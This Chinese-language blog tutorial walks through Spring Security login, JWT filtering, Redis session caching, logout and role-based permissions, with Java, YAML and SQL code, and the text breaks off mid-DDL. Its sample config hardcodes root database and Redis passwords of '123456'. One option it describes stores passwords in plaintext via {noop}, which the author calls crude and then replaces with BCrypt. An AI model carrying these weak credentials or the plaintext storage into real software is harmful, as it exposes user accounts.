url: jdbc:p6spy:mysql://192.168.1.115:3306/data_auto_endpoint?useUnicode=true&amp;characterEncoding=UTF-8&amp;serverTimezone=GMT%2B8&amp;useSSL=false username: root password: 123456 redis: # Redis本地服务器地址，注意要开启redis服务 host: 192.168.1.115 # Redis服务器端口,默认为6379.若有改动按改动后的来 port: 6379 #Redis服务器连接密码，默认为空，若有设置按设置的来 password: 123456 jedis: pool: # 连接池最大连接数，若为负数则表示没有任何限制 max-active: 8 # 连接池最大阻塞等待时间，若为负数则表示没有任何限制 max-wait: -1 # 连接池中的最大空闲连接 max-idle: 8 核心代码实现库表创建 建立 user 表（密码前先展示用 {noop} ） 重写接口的方法 实现 UserDetails 接口，重写里面的方法 重写 UserDetailsService 接口下的 loadUserByUsername 方法，因为这个方法默认是从内存中查的用户信息，我们需要改为去数据库查询 点击显/隐代码块(实现UserDetails接口) package com.adalucky.modules.system.service.impl; import com.adalucky.modules.system.model.entity.SysUser; import org.springframework.security.core.GrantedAuthority; import org.springframework.security.core.userdetails.UserDetails; import java.util.Collection; /** * @author ada * @Version JDK17 * @Description LoginUser 将用户封装成 UserDetails 对象 * @since 2022/4/22 21:30 */ public class LoginUser implements UserDetails { private SysUser sysUser; public SysUser getSysUser() { return sysUser; } public void setSysUser(SysUser sysUser) { this.sysUser = sysUser; } public LoginUser(SysUser sysUser) { this.sysUser = sysUser; } /** * 获取权限 * * @return 返回权限资源 */ @Override public Collection&lt;? extends GrantedAuthority&gt; getAuthorities() { return null; } /** * 获取密码 * * @return 返回密码 */ @Override public String getPassword() { return sysUser.getPassword(); } /** * 获取账号 * * @return 返回登录账户 */ @Override public String getUsername() { return sysUser.getUserName(); } /** * 判断账户是否未过期 * * @return 未过期返回 true,过期返回 false */ @Override public boolean isAccountNonExpired() { return true; } /** * 方法用于判断账户是否未锁定 * * @return 未锁定返回 true 锁定返回 false */ @Override public boolean isAccountNonLocked() { return true; } /** * 用于判断用户凭证是否没过期，即密码是否未过期 * * @return 没过期返回 true 过期返回 false */ @Override public boolean isCredentialsNonExpired() { return true; } /** * 方法用于判断用户是否可用 * * @return 可用返回 true 不可用返回 false */ @Override public boolean isEnabled() { return true; } } 点击显/隐代码块(重新loadUserByUsername方法) package com.adalucky.modules.system.service.impl; import com.adalucky.handler.BusinessException; import com.adalucky.modules.system.mapper.SysUserMapper; import com.adalucky.modules.system.model.entity.SysUser; import com.adalucky.response.ResultCode; import com.adalucky.utils.str.StringUtils; import com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.security.core.userdetails.UserDetails; import org.springframework.security.core.userdetails.UserDetailsService; import org.springframework.security.core.userdetails.UsernameNotFoundException; import org.springframework.stereotype.Service; /** * @author ada * @Version JDK17 * @Description 重新 loadUserByUsername 方法，实现去数据库查询 * @since 2022/4/22 20:29 */ @Service public class UserDetailServiceImpl implements UserDetailsService { @Autowired SysUserMapper mapper; @Override public UserDetails loadUserByUsername(String userName) throws UsernameNotFoundException { //查询用户信息 如果参数无效抛出自定义异常 if (!StringUtils.isEffective(userName)) { throw new BusinessException( ResultCode.PARAM_IS_BLANK.getCode(), ResultCode.PARAM_IS_BLANK.getMessage() ); } LambdaQueryWrapper&lt;SysUser&gt; queryWrapper = new LambdaQueryWrapper&lt;&gt;(); queryWrapper.eq(SysUser::getUserName, userName); var user = mapper.selectOne(queryWrapper); //TODO 查询用户权限 //查询成功后 封装到 UserDetails 对象 return new LoginUser(user); } } 启动测试 重写了上面的方法后我们可以启动一下进行测试，这个时候就需要输入我们数据的用户名和密码了 如果数据库直接是明文存储的话这里就会抛出 There is no PasswordEncoder mapped for the id \"null\" 问题分析 Spring Security 的用户认证流程 ① 把前端传过来的用户名去数据查询对应的用户 也就是调用我们重写的loadUserByUsername(String userName) 方法 ② 查询到以后通过 return new LoginUser(user) 封装用户信息到 UserDetails ③ 会自动调用 UserDetails 的实现类，也就是我们这里的 LoginUser 的 getPassword() 获取用户的密码 ④ 按照 默认或者我们指定的加密方式去和 getPassword() 获取用户的密码 比对 ⑤ 比对通过登录成功，默认返回用户名或密码错误提示 解决方案方案一 告诉 Spring Security 我就是要用明文存，你就用明文比对就行了其它的安全不安全，泄露不泄露，与你不相干 这种方式比较粗暴，直接直接再数据库的密码前面加上 {noop} 例如 123456 –&gt; {noop}123456 方案二简介 实际项目中我们不会把密码明文存储在数据库中，采用密码加密存储方式，也就是在我们注册用户的时候把明文密码以 Spring Security 的加密方式进行加密，存储在数据库里面，验证的时候就把前端的明文再按照之前的加密方式加密一般和数据库返回的用户密码比较一次，一样的话密码就是正确的，校验通过 默认使用的PasswordEncoder要求数据库中的密码格式为：{id}password 。它会根据id去判断密码的加密方式。但是我们一般不会采用这种方式。所以就需要替换PasswordEncoder。（也就是要像上面写成 {noop}password ） 我们一般使用SpringSecurity为我们提供的BCryptPasswordEncoder。 我们只需要使用把BCryptPasswordEncoder对象注入Spring容器中，SpringSecurity就会使用该PasswordEncoder来进行密码校验。 我们可以定义一个SpringSecurity的配置类，SpringSecurity要求这个配置类要继承WebSecurityConfigurerAdapte package com.adalucky.auth; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter; import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder; import org.springframework.security.crypto.password.PasswordEncoder; /** * @author ada * @Version JDK17 * @Description Spring Security 配置类 * @since 2022/3/7 21:37 */ @Configuration public class WebSecurityConfig extends WebSecurityConfigurerAdapter { @Bean public PasswordEncoder passwordEncoder() { //创建 CryptPasswordEncoder 注入到容器中，让 Spring Sercurity 默认以该方式进行加密 return new BCryptPasswordEncoder(); } } 代码测试 PasswordEncoder 加密encode() 从下面图片可以看出来，同一个明文通过同一种方式最后加密的结果不一样，究其原因就是每次使用的 盐值 不一样 $2a$10$tSn8ALjHUOtWPUziO8xIM.Auer5/yLLWsZspo3tsWI5OyBDea5mRS $2a$10$ + 22位盐值 + 加密后的密文 $2a 是 BCrypt 的版本 $10 是 10 次哈希 package com.adalucky.auth; import org.junit.jupiter.api.Test; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.boot.test.context.SpringBootTest; import org.springframework.security.crypto.password.PasswordEncoder; @SpringBootTest class WebSecurityConfigTest { @Autowired PasswordEncoder passwordEncoder; @Test void passwordEncoder() { var encode = passwordEncoder.encode(\"123456\"); var encode1 = passwordEncoder.encode(\"123456\"); System.out.println(encode); System.out.println(encode1); } } PasswordEncoder.matches(rawPassword,encodedPassword) 认证密码 密码认证结果返回布尔值 package com.adalucky.auth; import org.junit.jupiter.api.Test; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.boot.test.context.SpringBootTest; import org.springframework.security.crypto.password.PasswordEncoder; @SpringBootTest class WebSecurityConfigTest { @Autowired PasswordEncoder passwordEncoder; @Test void passwordEncoder() { System.out.println(passwordEncoder.matches(\"123456\", \"$2a$10$tSn8ALjHUOtWPUziO8xIM.Auer5/yLLWsZspo3tsWI5OyBDea5mRS\")); System.out.println(passwordEncoder.matches(\"123654\", \"$2a$10$tSn8ALjHUOtWPUziO8xIM.Auer5/yLLWsZspo3tsWI5OyBDea5mRS\")); } } 启动验证 找一个刚才加密后密文替换数据库之前的 {noop}123456 重启项目用明文进行登录即可 注册时密码加密 其实很简单，就是在实体类的构造方法中对 密码进行一次加密即可 public SysUser(UserDto userDto) { this.userId = userDto.userId(); this.username = userDto.username(); this.nikename = userDto.nikename(); this.email = userDto.email(); this.phone = userDto.phone(); this.sex = userDto.sex(); this.avatar = userDto.avatar(); this.password = new BCryptPasswordEncoder().encode(userDto.password()); } 登录接口实现 注意：登录 登出的接口地址不要用默认的 /login /logout 会和 Spring Security 的重合防止出现一些意向不到的错误，可以命名为 /user/login 这种 分析 再理一下思路，上面我们的 登录认证流程详解图中: 前端请求登录 –&gt; 默认用 AbstractAuthenticationProcessingFilter 的实现类 UsernamePasswordAuthenticationFilter 会去封装前端的账户和密码 –&gt; 调用 ProviderManager 的 authentication 方法认证 –&gt; xxx… –&gt; 调用重写的 UserDetailsService 接口下的 loadUserByUsername 去数据库查询用户 —&gt; 封装到 UserDetails 的实现类 LoginUser –&gt; 返回给 authentication 在接口中我们通过 AuthenticationManager 的 authenticate 方法来进行用户认证,所以需要在 SecurityConfig 中配置 把AuthenticationManager注入容器。 登录接口实现类注入 AuthenticationManager 调用 authenticate 方法进行认证 调用认证时需要传入 Authentication 对象，所以我们用 new UsernamePasswordAuthenticationToken() 把前端传过来的数据封装成 Authentication 对象，调用 authenticate 方法进行认证 时候就传这个对象 认证返回的结果不是空的 就表示有用户信息认证写进去了，这个写入 Redis 和返回 JWT 给前端即可即可 如果 认证通过 生成 jwt 写入 Redis 那么我们只要重写 实现类，在接口登录的时候调用即可 在登录接口需要放行，包括注册接口，主要涉及到一些不需要用户进行登录就能操作的接口 都需要进行放行 接下我们需要自定义登陆接口，然后让SpringSecurity对这个接口放行,让用户访问这个接口的时候不用登录也能访问。 认证成功的话要生成一个jwt，放入响应中返回。并且为了让用户下回请求时能通过jwt识别出具体的是哪个用户，我们需要把用户信息存入redis，可以把用户id作为key。 配置类 重写这个认证方法 authenticationManagerBean() 注入到容器中 配置请求放行等操作 package com.adalucky.auth; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import org.springframework.security.authentication.AuthenticationManager; import org.springframework.security.config.annotation.web.builders.HttpSecurity; import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter; import org.springframework.security.config.http.SessionCreationPolicy; import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder; import org.springframework.security.crypto.password.PasswordEncoder; /** * @author ada * @Version JDK17 * @Description SpringBoot Security自动配置类 * @since 2022/3/7 21:37 */ @Configuration /*@EnableWebSecurity @EnableGlobalMethodSecurity(prePostEnabled = true)*/ public class WebSecurityConfig extends WebSecurityConfigurerAdapter { @Bean public PasswordEncoder passwordEncoder() { //创建 CryptPasswordEncoder 注入到容器中，让 Spring Sercurity 默认以该方式进行加密 return new BCryptPasswordEncoder(); } @Bean @Override public AuthenticationManager authenticationManagerBean() throws Exception { //重写这个认证方法，返回父类的认证方法，也就是逻辑还是原来的逻辑，目的是为了注入到 bean 后我们可以在登录的时候去调用这个对象的认证方法 return super.authenticationManagerBean(); } @Override protected void configure(HttpSecurity http) throws Exception { http //关闭csrf .csrf().disable() //不通过Session获取SecurityContext .sessionManagement().sessionCreationPolicy(SessionCreationPolicy.STATELESS) .and() .authorizeRequests() // 对于登录接口、注册接口 允许匿名访问 .antMatchers(\"/user/login\", \"/user/register\").anonymous() // 除上面外的所有请求全部需要鉴权认证 .anyRequest().authenticated(); } } 实现 登录接口实现：① new UsernamePasswordAuthenticationToken() 封装前端的传参 ② 调用注入容器中的 authenticate 认证 ③ 返回的结果不为空后写入 Redis 缓存和 生成 JWT 返回给前端 @Autowired 分别注入 AuthenticationManager RedisCache /** * 登录 * * @param userDto 前端传入的账号和密码 * @return 封装的统一返回 */ public Result login(UserDto userDto) { //把前端传过来的用户名和密码封装成 authenticate 认证时候需要的 Authentication 对象 //UsernamePasswordAuthenticationToken 继承了 AbstractAuthenticationToken AbstractAuthenticationToken又实现了 Authentication UsernamePasswordAuthenticationToken authenticationToken = new UsernamePasswordAuthenticationToken(userDto.username(), userDto.password()); //调用 authenticate 方法认证就会去调用后面的 ProviderManager 后面会走到我们自己重写的 loadUserByUsername 方法去数据库查询用户信息进行认证 //loadUserByUsername方法 里面会把用户信息封装到 我们自己重写的 UserDetails 的实现类 LoginUser //authenticate 认证方法的返回对象就会包含这个 LoginUser 的信息 var authenticate = authenticationManager.authenticate(authenticationToken); if (Objects.isNull(authenticate)) { throw new RuntimeException(\"认证失败,用户名或密码错误\"); } var user = (LoginUser) authenticate.getPrincipal(); var userId = user.getSysUser().getUserId().toString(); redisCache.setCacheObject(\"login\" + userId, user); return Result.ok().message(\"登录成功\").data(\"token\", JwtUtil.createJWT(userId)); } JWT认证过滤器 上面的我们已经生成了 JWT 返回给前端了，那么前端请求未放行的接口我们就要去解析 token ①是否是正确有效的 ②请求的用户是谁 ③根据解析的用户 id 去 Redis中查询用户的信息存入 SecurityContextHolder 为什么叫 JWT 认证过滤器呢，因为 Spring Security 框架有自带的 过滤器链，然后我们在某个过滤器前面或者后面加入一个自己的过滤器，组成一个新的过滤器链 创建认证过滤器 这个过滤器的作用是为了拦截请求 校验用户的身份 ①如果 token 为空的话就放行，因为可能是登录接口，或者注册接口，这里放行了后面拦截器中发现不是 登录或者注册接口又没有用户信息传过来就认证失败 403 ②如果 token 解析失败证明就是非法的请求，抛出异常用户未登录 ③解析成功了的话就去根据用户 ID 在 Redis 中取数据 注意事项：①登录成功那个接口写入的 key 和这里取时候的 key 要一致 ②登录成功写入的数据类型和这里取时候接收的数据类型要兼容最好一致 过滤器尽量不要用 implements Filter 实现,因为这种方式可能在不同得 Severlet 版本中，一个请求过来过滤器会被调用多次，用 extends OncePerRequestFilter package com.adalucky.filter; import com.adalucky.modules.system.model.entity.SysUser; import com.adalucky.utils.redis.RedisCache; import com.adalucky.utils.str.StringUtils; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.security.authentication.UsernamePasswordAuthenticationToken; import org.springframework.security.core.context.SecurityContextHolder; import org.springframework.stereotype.Component; import org.springframework.web.filter.OncePerRequestFilter; import javax.servlet.FilterChain; import javax.servlet.ServletException; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; import java.util.Objects; import static com.adalucky.utils.jwt.JwtUtil.parseJWT; /** * @author ada * @Version JDK17 * @Description 自定义的 Jwt 认证过滤器，插入到 Spring Security 的过滤器链 * @since 2022/4/23 20:34 */ @Component //一般的过滤器可能会去 implements Filter 实现,但是这种方式可能在不同得 Severlet 版本中，一个请求过来过滤器会被调用多次 public class JwtAuthenticationTokenFilter extends OncePerRequestFilter { @Autowired RedisCache redisCache; @Override protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain) throws ServletException, IOException { // 获取 token,前端 Header 头必须要有这个 token 这个参数 var token = request.getHeader(\"token\"); if (!StringUtils.isEffective(token)) { //如果 token 为空就放行不去做 解析/读Redis/ 写入SecurityContextHolder，这里的放行只是当前拦截器放行，后面的拦截器还是会去走对应的逻辑 filterChain.doFilter(request, response); return; } // 解析 token String userid; try { userid = parseJWT(token).getSubject(); } catch (Exception e) { e.printStackTrace(); throw new RuntimeException(\"token非法\"); } // Redis 取数据 SysUser user = redisCache.getCacheObject(\"login\" + userid); if (Objects.isNull(user)) { throw new RuntimeException(\"用户未登录\"); } //存入SecurityContextHolder //TODO 获取权限信息封装到Authentication，第三个参数就是权限 UsernamePasswordAuthenticationToken authenticationToken = new UsernamePasswordAuthenticationToken(user, null, null); SecurityContextHolder.getContext().setAuthentication(authenticationToken); //放行到下一个过滤器 filterChain.doFilter(request, response); } } 添加JWT 认证过滤器 将我们写的过滤器添加到 Spring Security 的过滤器链里面 添加的位置根据具体的业务逻辑而定，我们这里就需要在最前面添加，UsernamePasswordAuthenticationFilter 之前 在 WebSecurityConfig 这个配置类中.addFilterBefore(jwtAuthenticationTokenFilter, UsernamePasswordAuthenticationFilter.class); @Override protected void configure(HttpSecurity http) throws Exception { http //关闭csrf .csrf().disable() //不通过Session获取SecurityContext .sessionManagement().sessionCreationPolicy(SessionCreationPolicy.STATELESS) .and() .authorizeRequests() // 对于登录接口、注册接口 允许匿名访问 .antMatchers(\"/user/login\", \"/user/register\").anonymous() // 除上面外的所有请求全部需要鉴权认证 .anyRequest().authenticated() .and() // 在UsernamePasswordAuthenticationFilter 过滤器前添加我们的自己写的 JWT 认证过滤器 .addFilterBefore(jwtAuthenticationTokenFilter, UsernamePasswordAuthenticationFilter.class); } 验证 到这里为止我们的期望是当前端传过token 有效后我们去解析 userId，然后去 Redis 中获取用户的信息，并把查询存到SecurityContextHolder 中 写入 SecurityContextHolder 的时候需要用 new UsernamePasswordAuthenticationToken 构造对应的对象 authentication 对象 这个 new 构造函数用两个参数和三个参数的，两个参数是用来构造账号+密码用于认证的，我们用的三个参数的 登出操作 注意接口命名之前也提过了不要和自带的重名了 这一步当我们登出的时候需要做的事情: 删 Redis 里面的用户信息 注意： ① 调用这个接口不需要传参，只需要前端传 Token ② 前端调用这个接口时候最先会走我们的 JWT 认证过滤器，这个时候认证通过会把我们的用户信息存在 SecurityContextHolder 没认证通过的话接口根本访问不到这里直接就会抛出 403 或者其它异常 ③ 删除 Redis 缓存的时候也就是从 SecurityContextHolder 获取到用户 ID 然后拼接以后删除 /** * 登出 * * @return 封装的 Result */ @Override public Result logout() { //退出登录的接口不需要传参，因为会携带 token(没带的话过滤器会拦截) SecurityContextHolder 中获取到 authentication 里面有用户信息（来源就是 JWT 认证过滤器存进去的） var authentication = SecurityContextHolder.getContext().getAuthentication(); var user = (SysUser) authentication.getPrincipal(); //删除 Redis 中的缓存 redisCache.deleteObject(\"login\" + user.getUserId()); return Result.ok().message(\"退出登录成功\"); } 配置项简介 我们之前重写了 SecurityConfig 配置类，这里做一个配置项，configure 的一些粗浅简介 重写这个不需要注入到 Bean 中，我估摸这这个配置类重写以后 Security 就会调用我们自己的配置类算是一种多态吧 上层调用会传入一个 HttpSecurity 对象，那么我们就可以对用对用的方法进行设置了，具体还有那些配置需要用的时候再 Baidu 一下 下列示例中的没一行表示一个配置项的结束 返回的还是一个 HttpSecurity 所以还是可以继续调用设置 and() 方法可以理解为一组设置结束，返回的还是一个 HttpSecurity 对象，可以继续设置 这是我们常见的链式编程 设置 .antMatchers(\"/user/login\", \"/user/register\").anonymous() 对于登录接口、注册接口 允许匿名访问 注意不带 token 才能正常访问，带了反而会抛异常 ，这就匿名访问 .antMatchers(\"/user/login\", \"/user/register\").permitAll() 下面这种 permitAll() 带不带 token 都可以访问 @Override protected void configure(HttpSecurity http) throws Exception { http //关闭csrf .csrf().disable() //不通过Session获取SecurityContext .sessionManagement().sessionCreationPolicy(SessionCreationPolicy.STATELESS) .and() .authorizeRequests() //对于登录接口、注册接口 允许匿名访问 .antMatchers(\"/user/login\", \"/user/register\").anonymous() //其它的请求，任意用户认证通过后都可访问 .anyRequest().authenticated() .and() //在UsernamePasswordAuthenticationFilter 过滤器前添加我们的自己写的 JWT 认证过滤器 .addFilterBefore(jwtAuthenticationTokenFilter, UsernamePasswordAuthenticationFilter.class); } 权限权限系统的作用 例如一个学校图书馆的管理系统，如果是普通学生登录就能看到借书还书相关的功能，不可能让他看到并且去使用添加书籍信息，删除书籍信息等功能。但是如果是一个图书馆管理员的账号登录了，应该就能看到并使用添加书籍信息，删除书籍信息等功能。 总结起来就是不同的用户可以使用不同的功能。这就是权限系统要去实现的效果。 我们不能只依赖前端去判断用户的权限来选择显示哪些菜单哪些按钮。因为如果只是这样，如果有人知道了对应功能的接口地址就可以不通过前端，直接去发送请求来实现相关功能操作。 所以我们还需要在后台进行用户权限的判断，判断当前用户是否有相应的权限，必须具有所需权限才能进行相应的操作。 授权基本流程 在SpringSecurity中，会使用默认的FilterSecurityInterceptor来进行权限校验。在FilterSecurityInterceptor中会从SecurityContextHolder获取其中的Authentication，然后获取其中的权限信息，然后确认当前用户是否拥有访问当前资源所需的权限，如果有权限的话 FilterSecurityInterceptor 才会放行 所以我们项目在登录的时候需要把用户的权限信息也存入 Authentication 对象，最后写入到 Redis 中。 其它接口进行请求时经过 JWT 认证锅炉器，去 Redis 取用户信息和和拥有的资源权限 并写入到 SecurityContextHolder 授权实现 这里记录一下授权的实现，采用自顶向下编写代码 这里先采用写死权限的方式快速体验下，后面用权限模型优化代码 接口限制访问权限 就是对我们的 API 接口做权限校验，当你需要有某个权限的时候我才让你访问我的接口，没有这个权限的话，不好意思，你谁啊，403 拜拜 这里所谓的权限我们就是采用一个字符串来标识，当你有这个标识的时候那我就给你放行，让你请求我的接口 一般实现的方式有两种：①基于配置的方案（这种一般是针对静态资源，也就是 springboot 项目下的静态资源）②基于注解的方案（现在前后端分离的项目都是用这种） 具体实现：①在 Spring Security 的配置类上添加一个注解 @EnableGlobalMethodSecurity(prePostEnabled = true) 开启对应的功能 ②在接口上添加注解@PreAuthorize(\"hasAuthority('你的权限关键字')\") Spring Security 在运行的时候会去读取这个注解里面的参数当做一个表达式，读取到了 hasAuthority() 后就会去调用这个方法，然后传入你自己的权限关键字去 SecurityContextHolder 的权限里面比对有没有一模一样的关键字，最后返回一个布尔值确定你是否能访问这个接口 //Spring Security 配置类中开启注解 @EnableGlobalMethodSecurity(prePostEnabled = true) //接口上添加权限访问控制注解，写入表达式和关键字（这个关键字只要是一个字符串都行 ） @PreAuthorize(\"hasAuthority('system:user:list')\") 封装权限信息 思路：在登录的时候我们就需要去数据库查询出来一些封装给用户对象，然后写入 Redis，（这里先写死，不去数据查询） 注意事项：我们是用一个集合来接受，最好是用一个不能重复的集合，并且在数据查询的时候也需要去重双重保障吧（后面查数据库权限的时候会再记录） 涉及变动：之前我的代码往 Redis 中存的都是 SysUser 的对象，现在加了一个 权限对象 Set&lt;String&gt; permissions 所以存的时候只能把拥有这两个对象的 LoginUser 存进去了， SysUser 和 Set&lt;String&gt; permissions 都是这个对象的属性 点击显/隐代码块(loadUserByUsername) package com.adalucky.modules.system.service.impl; import com.adalucky.handler.BusinessException; import com.adalucky.modules.system.mapper.SysUserMapper; import com.adalucky.modules.system.model.entity.SysUser; import com.adalucky.response.ResultCode; import com.adalucky.utils.str.StringUtils; import com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.security.core.userdetails.UserDetails; import org.springframework.security.core.userdetails.UserDetailsService; import org.springframework.security.core.userdetails.UsernameNotFoundException; import org.springframework.stereotype.Service; import java.util.Arrays; import java.util.HashSet; import java.util.Objects; import java.util.Set; /** * @author ada * @Version JDK17 * @Description 重新 loadUserByUsername 方法，实现去数据库查询 * @since 2022/4/22 20:29 */ @Service public class UserDetailServiceImpl implements UserDetailsService { @Autowired SysUserMapper mapper; @Override public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException { //查询用户信息 如果参数无效抛出自定义异常 if (!StringUtils.isEffective(username)) { throw new BusinessException( ResultCode.PARAM_IS_BLANK.getCode(), ResultCode.PARAM_IS_BLANK.getMessage() ); } //限制数据库只能有一条，因为手机号唯一，如果不止一条 getOne 就会抛异常，catch 捕获了就抛出自定义异常 LambdaQueryWrapper&lt;SysUser&gt; queryWrapper = new LambdaQueryWrapper&lt;&gt;(); queryWrapper.eq(SysUser::getUsername, username); SysUser user; try { user = mapper.selectOne(queryWrapper); } catch (Exception e) { throw new BusinessException( ResultCode.USER_REPEAT.getCode(), ResultCode.USER_REPEAT.getMessage() ); } //查询数据不为空后 构造到 LoginUser 中(也就是封装到 UserDetails 的对象) if (Objects.isNull(user)) { throw new BusinessException( ResultCode.PARAM_IS_BLANK.getCode(), ResultCode.PARAM_IS_BLANK.getMessage() ); } //List&lt;String&gt; menu = new ArrayList&lt;&gt;(Arrays.asList(\"system:user:list\")); Set&lt;String&gt; permissions = new HashSet&lt;String&gt;(Arrays.asList(\"system:user:list\")); return new LoginUser(user, permissions); } } 点击显/隐代码块(登录的实现方法) /** * 登录 * * @param userDto 前端传入的账号和密码 * @return 封装的统一返回 */ public Result login(UserDto userDto) { //把前端传过来的用户名和密码封装成 authenticate 认证时候需要的 Authentication 对象 //UsernamePasswordAuthenticationToken 继承了 AbstractAuthenticationToken AbstractAuthenticationToken又实现了 Authentication UsernamePasswordAuthenticationToken authenticationToken = new UsernamePasswordAuthenticationToken(userDto.username(), userDto.password()); //调用 authenticate 方法认证就会去调用后面的 ProviderManager 后面会走到我们自己重写的 loadUserByUsername 方法去数据库查询用户信息进行认证 //loadUserByUsername方法 里面会把用户信息封装到 我们自己重写的 UserDetails 的实现类 LoginUser //authenticate 认证方法的返回对象就会包含这个 LoginUser 的信息 var authenticate = authenticationManager.authenticate(authenticationToken); if (Objects.isNull(authenticate)) { throw new RuntimeException(\"认证失败,用户名或密码错误\"); } var loginUser = (LoginUser) authenticate.getPrincipal(); var user = loginUser.getSysUser(); var userId = user.getUserId().toString(); //写入 loginUser 时， permissions 必须要有对应的 get set 方法 redisCache.setCacheObject(\"login\" + userId, loginUser); return Result.ok().message(\"登录成功\").data(\"token\", JwtUtil.createJWT(userId)); } 点击显/隐代码块(LoginUser对象) package com.adalucky.modules.system.service.impl; import com.adalucky.modules.system.model.entity.SysUser; import com.alibaba.fastjson.annotation.JSONField; import lombok.Data; import lombok.NoArgsConstructor; import org.springframework.security.core.GrantedAuthority; import org.springframework.security.core.authority.SimpleGrantedAuthority; import org.springframework.security.core.userdetails.UserDetails; import java.util.Collection; import java.util.Set; import java.util.stream.Collectors; /** * @author ada * @Version JDK17 * @Description LoginUser 将用户封装成 UserDetails 对象 * @since 2022/4/22 21:30 */ public class LoginUser implements UserDetails { private SysUser sysUser; //存储权限集合 private Set&lt;String&gt; permissions; public SysUser getSysUser() { return sysUser; } public void setSysUser(SysUser sysUser) { this.sysUser = sysUser; } public Set&lt;String&gt; getPermissions() { return permissions; } public void setPermissions(Set&lt;String&gt; permissions) { this.permissions = permissions; } public void setAuthorities(Set&lt;SimpleGrantedAuthority&gt; authorities) { this.authorities = authorities; } public LoginUser() { } /** * 构造 UserDetails * * @param user SysUser 对象 * @param permissions 用户的权限资源集合 */ public LoginUser(SysUser user, Set&lt;String&gt; permissions) { this.sysUser = user; this.permissions = permissions; } // fastjson 的注解，不进行序列化，因为这个是 Security 提供的序列化会报错 我们存在 Redis 中 存Set&lt;String&gt; permissions 对象 @JSONField(serialize = false) private Set&lt;SimpleGrantedAuthority&gt; authorities; /** * 获取权限 * * @return 返回权限资源集合 (将 permissions 集合中的 String 标识存入后返回，只有第一次为空的时候才会写，不为空直接返回权限集合) * 如果修改了用户权限需要删除 Redis 重新登录一次或者重写写一次权限不然这里权限不为空就获取不到最新的权限了 */ @Override public Collection&lt;? extends GrantedAuthority&gt; getAuthorities() { //这里优化一些代码加个 if 判断，当权限为空的时候先去把权限写入到 Set&lt;SimpleGrantedAuthority&gt; authorities 中，如果不为空直接返回这个权限，不然每次认证权限的时候调用一次 getAuthorities() 方法都会重复写同样的东西 if (authorities != null) { return authorities; } /* Set&lt;GrantedAuthority&gt; authorities = new HashSet&lt;&gt;(); permissions.forEach(permission-&gt;authorities.add(new SimpleGrantedAuthority(permission))); return authorities; */ //函数式编程: 先把 permissions 转换成一个流，然后里面的值到一个 map 里，里面的每一个对象调用一次 SimpleGrantedAuthority 的构造方法，最后再调用 collect() 方法收集成一个 Set 集合 //把permissions中String类型的权限信息封装成SimpleGrantedAuthority对象 authorities = permissions.stream().map(SimpleGrantedAuthority::new).collect(Collectors.toSet()); return authorities; } /** * 获取密码 * * @return 返回密码 */ @Override public String getPassword() { return sysUser.getPassword(); } /** * 获取账号 * * @return 返回登录账户 */ @Override public String getUsername() { return sysUser.getUsername(); } /** * 判断账户是否未过期 * * @return 未过期返回 true,过期返回 false */ @Override public boolean isAccountNonExpired() { return true; } /** * 方法用于判断账户是否未锁定 * * @return 未锁定返回 true 锁定返回 false */ @Override public boolean isAccountNonLocked() { return true; } /** * 用于判断用户凭证是否没过期，即密码是否未过期 * * @return 没过期返回 true 过期返回 false */ @Override public boolean isCredentialsNonExpired() { return true; } /** * 方法用于判断用户是否可用 * * @return 可用返回 true 不可用返回 false */ @Override public boolean isEnabled() { return true; } } RBAC权限模型简介 RBAC权限模型（Role-Based Access Control）即：基于角色的权限控制。这是目前最常被开发者使用也是相对易用、通用权限模型。 建表 按照简介所示图，一个我们需要 5 张表进行组成一个基本的 RBAC 的模型 点击显/隐代码块(建表) -- 创建用户表 DROP TABLE IF EXISTS `sys_user`; CREATE TABLE `sys_user` ( `user_id` int NOT NULL AUTO_INCREMENT COMMENT '用户ID', `dept_id` int DEFAULT NULL COMMENT '部门ID', `username` varchar(11) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '登录账号', `nikename` varchar(10) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '用户昵称', `type` varchar(2) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT '00' COMMENT '用户类型（00系统用户）', `email` varchar(50) DEFAULT '' COMMENT '用户邮箱', `phone` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT '' COMMENT '手机号码', `sex` int DEFAULT '2' COMMENT '用户性别（0女 1男 2保密）', `avatar` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT 'https://www.adalucky.com/medias/16229390604952.png' COMMENT '头像路径', `password` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT '' COMMENT '密码', `status` int DEFAULT '0' COMMENT '帐号状态（0 启用 1 禁用）', `deleted` int DEFAULT '0' COMMENT '删除标志（0代表未删除 1代表已删除）', `project_id` int DEFAULT NULL COMMENT '默认项目ID', `login_ip` varchar(50) DEFAULT '' COMMENT '最后登陆IP', `login_date` datetime DEFAULT NULL COMMENT '最后登陆时间', `create_by` varchar(30) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL COMMENT '创建者', `create_time` timestamp NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间', `update_by` varchar(30) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL COMMENT '更新者', `update_time` timestamp NULL DEFAULT NULL ON UPDATE CURRENT_TIMESTAMP COMMENT '更新时间', `version` int DEFAULT '1' COMMENT 'Mybatis-Plus 乐观锁标记', `remark` varchar(500) DEFAULT '' COMMENT '备注', PRIMARY KEY (`user_id`) ) ENGINE = InnoDB DEFAULT CHARSET = 